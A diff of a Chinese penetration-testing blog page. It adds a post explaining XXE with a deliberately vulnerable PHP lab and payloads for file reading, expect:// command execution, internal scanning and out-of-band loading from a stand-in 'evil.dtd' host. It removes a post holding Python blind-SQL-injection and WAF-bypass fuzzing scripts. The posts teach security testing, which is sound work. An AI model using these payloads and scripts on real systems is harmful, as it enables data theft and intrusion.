@@ -258,6 +258,240 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/03/浅谈XXE漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/05/03/浅谈XXE漏洞/" itemprop="url">
+                  浅谈XXE漏洞
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-03T15:30:04+08:00">
+                2018-05-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/03/浅谈XXE漏洞/" class="leancloud_visitors" data-flag-title="浅谈XXE漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-XML"><a href="#0x00-XML" class="headerlink" title="0x00 XML"></a>0x00 XML</h2><p>XML是可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言，与HTML的不同在于XML被设计用来传输和存储数据而HTML被设计用来显示数据。</p>
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<p>XML声明即是位于XML文档开始部分的第一行，规定了xml版本和编码格式。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>DTD(Document Type Definition) 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</p>
+<p>文档元素即下面例子中note中所有部分，每个xml文档必须包含一个根元素，下面的例子中根元素就是note<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x01-DTD-Document-Type-Definition"><a href="#0x01-DTD-Document-Type-Definition" class="headerlink" title="0x01 DTD(Document Type Definition)"></a>0x01 DTD(Document Type Definition)</h2><p>上面我们只是简要说了一下XML的结构，下来我们拿出我们重点关注的DTD文档类型定义来详细说明一下。</p>
+<h4 id="DTD-引用方式"><a href="#DTD-引用方式" class="headerlink" title="DTD 引用方式"></a>DTD 引用方式</h4><ul>
+<li><p>1.DTD 内部声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2.DTD 外部引用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>3.引用公共DTD</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="DTD-实体声明"><a href="#DTD-实体声明" class="headerlink" title="DTD 实体声明"></a>DTD 实体声明</h4><ul>
+<li>1.内部实体声明<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 “实体的值”&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号</p>
+<ul>
+<li>2.外部实体声明<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>外部引用可支持http，file等协议，不同的语言支持的协议不同。</p>
+<h2 id="0x02-XXE-XML-External-Entity-attack"><a href="#0x02-XXE-XML-External-Entity-attack" class="headerlink" title="0x02 XXE(XML External Entity attack)"></a>0x02 XXE(XML External Entity attack)</h2><p>XML外部实体注入，简称XXE。XXE使攻击者能够从服务器或连接网络泄露正常受保护的文件。</p>
+<p>有了XML实体，关键字‘SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。</p>
+<p>简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。</p>
+<h2 id="0x03-XXE环境搭建"><a href="#0x03-XXE环境搭建" class="headerlink" title="0x03 XXE环境搭建"></a>0x03 XXE环境搭建</h2><p>我们新建一个存在xxe漏洞的index.php，写入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml=simplexml_load_string($_POST[&apos;xml&apos;]);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们尝试一个正常使用的例子，在firefox的hackbar插件中传入数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xml=&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以得到回显：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/xxe01.jpg" alt=""></p>
+<p>此时，我们的环境搭建完成。</p>
+<h2 id="0x04-恶意代码的利用方式"><a href="#0x04-恶意代码的利用方式" class="headerlink" title="0x04 恶意代码的利用方式"></a>0x04 恶意代码的利用方式</h2><p>我们上面已经说过引用实体的方式，我们这里可以采用这几种方式在hackbar的post中写入恶意代码：</p>
+<ul>
+<li><p>1直接使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">	&lt;!ENTITY b SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2调用远程dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">	&lt;!ENTITY b SYSTEM &quot;http://xxxx.com/xxx.dtd&quot;&gt;</span><br><span class="line">]</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>在xxxx.com的xxx.dtd中写入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>3无回显时发送给远程服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">                &lt;!ENTITY % f SYSTEM &quot;http://www.hack.com/evil.dtd&quot;&gt;</span><br><span class="line">                 %f;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;b;&lt;/a&gt;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>其中远程服务器中evil.dtd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x05-xxe攻击方式"><a href="#0x05-xxe攻击方式" class="headerlink" title="0x05 xxe攻击方式"></a>0x05 xxe攻击方式</h2><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>通过file协议任意读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$note=&lt;&lt;&lt;XML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">XML;</span><br><span class="line">$xml=simplexml_load_string($note);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>通过expect协议进行命令执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$note=&lt;&lt;&lt;XML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://ifconfig&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">XML;</span><br><span class="line">$xml=simplexml_load_string($note);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h4><p>通过simplexml_load_string函数访问内网ip和端口进行扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$note=&lt;&lt;&lt;XML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.226:81&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">XML;</span><br><span class="line">$xml=simplexml_load_string($note);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$note=&lt;&lt;&lt;XML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.226:80&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">XML;</span><br><span class="line">$xml=simplexml_load_string($note);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="内网攻击"><a href="#内网攻击" class="headerlink" title="内网攻击"></a>内网攻击</h4><p>通过simplexml_load_string函数中带有恶意代码的url对内网网站进行攻击，直接在内网url的get参数中提交payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$note=&lt;&lt;&lt;XML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.226:80/test/xxxx.php?xxxxx&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">XML;</span><br><span class="line">$xml=simplexml_load_string($note);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x06-应对"><a href="#0x06-应对" class="headerlink" title="0x06 应对"></a>0x06 应对</h2><ul>
+<li>1.禁用外部实体</li>
+<li>2.过滤用户提交的xml信息</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/03/MSSQL注入总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2230,187 +2464,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/22/python脚本实现自动化sql盲注/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/04/22/python脚本实现自动化sql盲注/" itemprop="url">
-                  python脚本实现自动化sql盲注
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-22T22:59:37+08:00">
-                2018-04-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/04/22/python脚本实现自动化sql盲注/" class="leancloud_visitors" data-flag-title="python脚本实现自动化sql盲注">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面几篇博客写了sql注入时的绕过方法和盲注时经常使用的函数，但是我们明显能看到一个问题，那就是盲注时候需要对比每个字符的ascii码，如果手工注入就会十分浪费时间，所以我们这次尝试用python实现自动话注入。</p>
-<h2 id="0x01-布尔型盲注"><a href="#0x01-布尔型盲注" class="headerlink" title="0x01 布尔型盲注"></a>0x01 布尔型盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#! -*- encoding:utf-8 -*-</span><br><span class="line"># python3</span><br><span class="line"># author: leticia</span><br><span class="line">import requests</span><br><span class="line">#用这里的语句分别替换id中的内容即可爆库、表、字段</span><br><span class="line">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = &apos;xxx&apos;</span><br><span class="line">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = &apos;xxx&apos; and TABLE_NAME = &apos;xxx&apos;</span><br><span class="line">dic=&apos;0123456789abcdefghijklmnopqrstuvwxyz,&apos;</span><br><span class="line">url=&apos;http://127.0.0.1/sqli-labs/Less-8/?id=1\&apos; and &apos;</span><br><span class="line">string=&apos;&apos;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in dic:</span><br><span class="line">        id=&quot;substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;--+&quot;.format(str(i),ascii(j))</span><br><span class="line">        #print(id)</span><br><span class="line">        url_get=(url+id)</span><br><span class="line">        #print(url_get)</span><br><span class="line">        r=requests.get(url_get)</span><br><span class="line">        if &quot;You&quot; in r.text:</span><br><span class="line">            string+=j</span><br><span class="line">            print(string)</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
-<p>这里我们可以通过构造id的值，循环遍历库名集合的前100个位置与dic中的所有字符进行比对，然后如果返回页面正常即存在user关键字（根据实际情况更改），就将这个字母保存在string中，遍历完之后输出string。</p>
-<h2 id="0x02-基于时间的盲注"><a href="#0x02-基于时间的盲注" class="headerlink" title="0x02 基于时间的盲注"></a>0x02 基于时间的盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#! -*- encoding:utf-8 -*-</span><br><span class="line"># python3</span><br><span class="line"># author: leticia</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">#用这里的语句分别替换id中的内容即可爆库、表、字段</span><br><span class="line">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = &apos;xxx&apos;</span><br><span class="line">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = &apos;xxx&apos; and TABLE_NAME = &apos;xxx&apos;</span><br><span class="line">dic=&apos;0123456789abcdefghijklmnopqrstuvwxyz,&apos;</span><br><span class="line">url=&apos;http://127.0.0.1/sqli-labs/Less-8/?id=1\&apos; and &apos;</span><br><span class="line">string=&apos;&apos;</span><br><span class="line">for i in range(100):</span><br><span class="line">    for j in dic:</span><br><span class="line">        id=&quot;if((substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;),sleep(3),0)--+&quot;.format(str(i),ascii(j))</span><br><span class="line">        #print(id)</span><br><span class="line">        url_get=(url+id)</span><br><span class="line">        #print(url_get)</span><br><span class="line">        r=requests.get(url_get)</span><br><span class="line">        sec=r.elapsed.seconds</span><br><span class="line">        if sec &gt; 2:</span><br><span class="line">            string+=j</span><br><span class="line">            print(string)</span><br><span class="line">            break</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
-<p>这里我们可以通过构造id的值，循环遍历库名集合的前100个位置与dic中的所有字符进行比对，然后如果返回页面需要两秒以上才能返回（即触发sleep(3)函数），就将这个字母保存在string中，遍历完之后输出string。</p>
-<h2 id="0x03-fuzz测试"><a href="#0x03-fuzz测试" class="headerlink" title="0x03 fuzz测试"></a>0x03 fuzz测试</h2><p>在安全测试中，模糊测试（fuzz testing）是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。在某些有安全狗一类的防护系统下，如果要手工判断过滤规则需要安全工作者很高的执行力，在这些情况下fuzz测试可以充分利用机器生成无规则且大量的数据来进行测试，拥有很高的效率。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#! -*- encoding:utf-8 -*-</span><br><span class="line"># python3</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">fuzz_zs = [&apos;/*&apos;, &apos;*/&apos;, &apos;/*!&apos;, &apos;*&apos;, &apos;=&apos;, &apos;`&apos;, &apos;!&apos;, &apos;@&apos;, &apos;%&apos;, &apos;.&apos;, &apos;-&apos;, &apos;+&apos;, &apos;|&apos;, &apos;%00&apos;]</span><br><span class="line">fuzz_sz = [&apos;&apos;, &apos; &apos;]</span><br><span class="line">fuzz_ch = [&quot;%0a&quot;, &quot;%0b&quot;, &quot;%0c&quot;, &quot;%0d&quot;, &quot;%0e&quot;, &quot;%0f&quot;, &quot;%0g&quot;, &quot;%0h&quot;, &quot;%0i&quot;, &quot;%0j&quot;]</span><br><span class="line"></span><br><span class="line">fuzz = fuzz_zs + fuzz_sz + fuzz_ch</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0&quot;,</span><br><span class="line">    &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;</span><br><span class="line">&#125;</span><br><span class="line">url_start = &quot;http://127.0.0.1/waf/test.php?id=1&quot;</span><br><span class="line">test_url=requests.get(url_start,headers=headers)</span><br><span class="line">print(test_url.text)</span><br><span class="line"></span><br><span class="line">for a in fuzz:</span><br><span class="line">    for b in fuzz:</span><br><span class="line">        for c in fuzz:</span><br><span class="line">            for d in fuzz:</span><br><span class="line">                exp = &quot;/*!union&quot; + a + b + c + d + &quot;select*/ 1,2,3&quot;</span><br><span class="line">                url = url_start + exp</span><br><span class="line">                res = requests.get(url=url, headers=headers)</span><br><span class="line">                print(&quot;Now URL:&quot; + url)</span><br><span class="line">                if &quot;user&quot; in res.text:</span><br><span class="line">                    print(&quot;Find Fuzz bypass:&quot; + url)</span><br><span class="line">                    with open(r&quot;C:\Users\Leticia\Desktop\results.txt&quot;, &apos;a&apos;, encoding=&apos;utf-8&apos;) as r:</span><br><span class="line">                        r.write(url + &quot;\n&quot;)</span><br></pre></td></tr></table></figure>
-<p>这里将fuzz常用到的内联注释、特殊字符等，随机组合，循环添加到union select之间，如果返回的页面正常显示user，没有进入防护系统的拦截界面，说明这里的表达式没有被过滤，然后写到results.txt中保存。</p>
-<p>之后我们可以利用results.txt分析到的规则，再完善前面的其他脚本，进行自动化注入。</p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>做测试时不能总是依赖sqlmap等完全自动化工具，也不能完全依赖手注，根据面对的实际情况编写适当的脚本，才能更熟练的掌握这些漏洞。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2460,7 +2513,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
